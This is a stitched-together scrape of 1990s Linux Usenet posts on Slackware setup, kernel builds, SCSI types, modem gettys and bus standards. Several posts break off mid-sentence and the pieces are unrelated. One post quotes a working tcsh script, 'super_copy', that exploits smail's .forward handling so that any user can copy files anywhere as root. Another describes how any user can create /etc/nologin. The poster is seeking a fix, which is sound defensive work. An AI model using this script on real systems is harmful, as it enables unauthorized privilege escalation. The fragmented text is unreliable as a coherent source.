Just run Linux as you would at any other time. It'll start using bounce 
buffers for DMA to/from 16Mb+ addresses.

This is a repeat post, the original post was missing a few
introductory sentences, to wit...

We are running linux 1.1.18 loaded with Slackware 2.0.
When root runs the passwd program there is no problem.
However, when another user runs passwd the program
quits after entering the new password (twice) with:

Can't open /etc/ptmp, can't update password.

Running ls -l to see /etc I get:
drwxr-xr-x  10 root root [stuff] etc/

Any suggestions?

        While we are wading through the wave of followups, how about
someone explaining the difference between all the SCSI.  I have heard of
SCSI, SCSI-2, fast SCSI-2, wide SCSI, and AV-SCSI.  What are all these?
Which is best?  Which is worst?  How do you tell which one you have?
Are any of them compatible with the others?  Why is this not addressed

I've never heard of "make proper"...

I always use:
make config
make dep ; make clean
make zlilo
rdev -R /vmlinuz 1

The make zlilo can be replaced with "make zImage" (I'm not sure about caps) 
if you don't use lilo...

Hi,

I don't know if the previous posting made it to the net. But I will try again.
Someone mentioned a week ago or so about a authentication package used by
Livingston equipment to do remote authentication from a authentication host.
So I looked it up with archie and got the stuff. So far so good. After some
tweaking with the makefile I now have it gotten to compile. But it doesn't seem
to work quite right. I have done some debugging and it seems that its having
some kind of bytesex problem. It seems its written for a BIG endian machine and
doesn't seem to work quite right on a LITTLE endian machine. Now I probaly can
fix it myself, but probably someone already done it and its just a waste of
time to do it again. If someone has patches to make it work under Linux could
he please send them to me.

Thanks,

Marco

I added a line to /etc/fstab to try to allow users to mount floppies on /mnt:

  /dev/fd0        /mnt    msdos   user,rw,noauto,sync

However, when trying to mount a floppy as a normal user, I got the error
message:

  can't create lock file /etc/mtab~: Permission denied

To avoid this, should I:

1. Make /etc writable by users? [Seems like overkill]

2. Make 'mount' suid?  [Sounds dangerous]

3. Use the package 'usermount' instead?

The answer is: it depends on the software, if any, you run to process
incoming calls.  If you run "mgetty+sendfax" or my "ZyXEL" program, you
need to use "ttySx", *not* "cuax".

I have a drive with bad sectors (found out when
formatting with DOS) . I wanted to  install Linux
on it and when I got to the point in Slackware 
installation , I opted for slow format looking for
bad blocks , but the system hangs up every time .

Is the formatting programming not able to handle the
bad sectors / bad blocks ? If so, how do I fix it ?
Do I need to do a low level format , first ?
How do I install Linux on this partition ? (without having
to take out my other partitions and OSes (dos,NT and OS/2)
I'd rather avoid having to do a low level format on the
whole disk and then install all the OSes again. And
not having a tape drive certainly aggravates the situation.

My system is 
486 DX2/66  VLB

I'm getting exactly this behavior with a Colorado Jumbo 250.  Linux

It seems unlikely this is caused by a bad sector on the tape, since
the exact point of failure varied quite a bit.  I've tried several

I was wondering if anyone else was having problems getting there LMS/Philips
CDROM drive to work with 1.1.51? Or has anyone had problems with
there devices with 1.1.51?  I downloaded the linux-1.1.45.tar.gz
file, tar -zxvof'd it, then downloaded the separate patches: patch46,
patch47, patch48, patch49, patch50, and patch51.  I then d/l'd the file
lmscd0.3c.tar.gz, which is the LMS/Philips CDROM patch.  The lmscd0.3c is
for linux version 1.1.47, so I insalled the patches up to 1.1.47, then
installed my CDROM one, then installed patch 48, 49, 50, and 51.  When I
rebooted, everything worked great, so I thought.  I tried my CDROM,
/dev/lmscd, and it comes up with the normal /dev/lmscd already busy, or /mnt
already mounted, etc.  I then tried to use my modem.  I couldn't.  I tried
to send, and access anything through /dev/cua1, and nothing got to my modem. 
I put the old /vmlinuz file back, for 1.0.9, and everything works great
again.  Does anyone know why this is happening?   A reply in E-mail would be
greatly appreasiated, since I don't normally read this news-group.

For some reason, I thought the previous security fix only applied

Now that I know it does, the article with the fix has expired here.

What is the fix to keep the following script from working?!?!?!?

#!/bin/tcsh -f
#script to copy a file anywhere on the system.
echo $2 > ~/.forward
mail -r root $USER < /dev/null
sleep 10
rm ~/.forward
cp -a $*
---> end super_copy <---


For now I just removed all mail from my system, until I recompile
with the fixes for the three security bugs that have been posted
reciently.  Sorry for posting this, but I've seen simmular type
scripts posted all over the net receintly, with no good suggestions
on how to fix it other than switching to "sendmail"...  Now even
an idiot can hack smail system in less than 15 seconds.

Well, you have to use /dev/ttyS* for the modem, if you make sure that the
carrier line is only active if a carrier is present, and that the modem
auto-answers (ATS0=1&C1&W). The kernel will make the getty process block.

Better then "agetty", use "getty_ps", it's not that primitive.


The other approach is to use "mgetty+sendfax", whose "*getty" understands
about modems, knows about RING and ATA leading to CONNECT. I naturally
prefer mgetty, but I'm most heavily biased (I wrote it).

I agree that PCI is a better standard and will long outlive VLB.  But VLB on
a 486 motherboard is generally somewhat faster than PCI.  Considering that
VLB is almost a direct connection to the 486's pins, it's easy to understand
why.

VLB is defined up to 50Mhz, although that's a "zero-slot" speed.

PCI is 33Mhz, not 66Mhz.  That's unlikely to change.
There are defined extensions to 64 bit address and 64 bit data, but no
commonly available hardware implements either.  (Note that running 64 bit
addresses on a 32 bit PCI bus will be slower than a straight 32 bit bus.)

Generally, devices on VLB look the same as their ISA counterpart while
devices on PCI do not.  Two immediate obvious differences are I/O locations
and interrupts.  A VLB card uses jumpered/EEPROM locations, which PCI has
the BIOS decide where to place devices.  VLB uses the edge triggered ISA bus
interrupts (the few ISA contacts you see on VLB cards are for power and
interrupts), while the PCI bus uses level-triggered slot-specific interrupts.

Alas many of the chipsets have bugs, which are worked around with varying
degrees of success.  I had horrible problems with the NCR53c810 controller

setup.

I've had luck with a generic S3-805 board (almost a year ago -- probably out
of production by now) and ATI Mach32 boards.

The '810 driver is in the most recent development kernels, and it does work
well.  If you have problems it's most likely your hardware not the driver,
despite all symptoms pointing to a flakey driver.

Yes, it means that your machine can be multi-homed on different nets.

If you are asking about having multiple cards on the same network, no, there
is no advantage.

It sits there waiting for standard input to close. Press ^D. Then you will
find that /etc/nologin has been created and can have been created by any
user. The patch recently posted makes this file creation happen under the
UID of the calling user rather than as root.

I assume a right-to-use microcode license comes with every board Compaq ships.
Given that, where is the obstacle to a Linux driver?

[[ I suspect that driver for this board would need a user-level "helper"
program to download the microcode from the MS-DOS distribution floppy (or
whereever it's keep) to the board, but this is just a pain in the ass, not
a fatal flaw.]]

I'd like to know about all the BBS's for Linux  --  I found EagleBBS
and I've heard about a couple more, xbbs and unixboard, but I don't 
know where to find them.  I'm currently running a DOS based BBS, with
Maximus 2.01/wb and like it a lot.  I'd surely like to find a BBS for
Linux with some/most/all the features of MAX.  

There is a package used by a lot of DOS BBS's called BinkleyTerm that
is also available in a UNIX flavor.  It is used primarily as a mailer
that distinguishes between human and machine callers; it passes human
calls to the BBS and machine calls to the mail handling programs.  One
of it's features is that it passes a parameter showing the baud rate 
of the call, which can be picked up by any interested program for 
determining DL time, etc.

Do you possibly have a list of all the *ix BBS's or know of someone 
who does?  Or can you tell about the features of the ones you are
acquainted with?  I don't want much, do I?  :)
